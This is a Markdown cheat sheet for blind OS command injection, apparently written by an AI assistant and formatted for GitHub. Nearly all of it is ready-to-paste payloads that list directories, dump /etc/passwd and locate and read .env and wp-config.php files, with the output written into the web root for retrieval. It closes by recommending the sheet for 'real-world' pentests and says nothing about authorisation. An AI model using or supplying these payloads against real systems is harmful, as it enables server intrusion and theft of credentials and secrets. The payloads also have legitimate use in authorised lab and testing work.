# Here is the **GitHub-Ready Markdown Cheat Sheet**. You can copy and paste this directly into a `README.md` file, a GitHub Gist, or a Wiki page.

---

```markdown
# 🚀 Ultimate Blind Command Injection Cheat Sheet

## 🔥 The 4 Common Web Roots (Test These)

| # | Path | Context |
| :---: | :--- | :--- |
| 1 | `/var/www/html/` | Ubuntu/Debian (Apache/Nginx) - Most Common |
| 2 | `/var/www/` | Older CentOS/RHEL / Custom Setups |
| 3 | `/usr/local/apache2/htdocs/` | Apache installed from source |
| 4 | `/var/www/images/` | Common in PortSwigger Labs |

---

## 🎯 The "Shotgun" Payload (Find Root in 1 Request)

Tests all 3 defaults at once. Paste into the vulnerable parameter (e.g., `email`).

```bash
|| (ls -la /var/www/html/ > /var/www/html/A.txt; ls -la /var/www/ > /var/www/B.txt; ls -la /usr/local/apache2/htdocs/ > /usr/local/apache2/htdocs/C.txt) ||
```

**Check:** Visit `/A.txt`, `/B.txt`, and `/C.txt` in your browser.  
**Winner:** The one that shows a folder listing is your **Web Root**. Save this path as `[ROOT]`.

---

## 📂 The "Zero-Guess" Payload (Find `index.php` directly)

If the Shotgun fails, find the homepage location instantly:

```bash
|| find / -name "index.php" 2>/dev/null | head -1 > /var/www/html/INDEX.txt ||
```

**Check:** Visit `/INDEX.txt`.  
**Output Example:** `/home/app/public/index.php` → Your **Root** is `/home/app/public/`.

---

## 🔑 Steal Passwords (Always Works)

`/etc/passwd` is **always** present on every Linux machine. No guessing needed.

```bash
|| cat /etc/passwd > [ROOT]/pass.txt ||
```

**Check:** Visit `/pass.txt` to see all system usernames.

---

## 🕵️ Find Custom Configs (Databases, API keys, etc.)

```bash
|| find / -name "config.php" -o -name ".env" -o -name "wp-config.php" -o -name "*.conf" 2>/dev/null > [ROOT]/configs.txt ||
```

**Check:** Visit `/configs.txt` for file paths, then use `cat` to read them individually.

---

## 📋 Quick Reference Table

| Goal | Payload (Replace `[ROOT]` with your found path) |
| :--- | :--- |
| **Test 3 Defaults** | `\|\| (ls -la /var/www/html/ > /var/www/html/A.txt; ls -la /var/www/ > /var/www/B.txt; ls -la /usr/local/apache2/htdocs/ > /usr/local/apache2/htdocs/C.txt) \|\|` |
| **Find Homepage** | `\|\| find / -name "index.php" 2>/dev/null \| head -1 > [ROOT]/home.txt \|\|` |
| **Steal System Users** | `\|\| cat /etc/passwd > [ROOT]/users.txt \|\|` |
| **Find All Configs** | `\|\| find / -name "*.env" -o -name "*.conf" -o -name "config.*" 2>/dev/null > [ROOT]/env.txt \|\|` |
| **Read a Config File** | `\|\| cat /var/www/html/wp-config.php > [ROOT]/wp.txt \|\|` |
| **List Directory Contents** | `\|\| ls -la /home/ > [ROOT]/home_dir.txt \|\|` |

---

## 🛠️ Pro Tips

- **`cat`** = Read files.
- **`ls -la`** = List folders (verify existence/permissions).
- **`>`** = Redirect output to a web-accessible file.
- **`2>/dev/null`** = Hide "Permission Denied" errors for cleaner output.
- **`head -1`** = Show only the first result (prevents huge files).
```

---

**How to use this:**
1. Copy the text above.
2. Go to GitHub and create a new **Gist** or **README.md**.
3. Paste it.
4. GitHub will render it beautifully with tables, code blocks, and headings.

You now have a professional, portable reference for any blind command injection lab or real-world pentest!
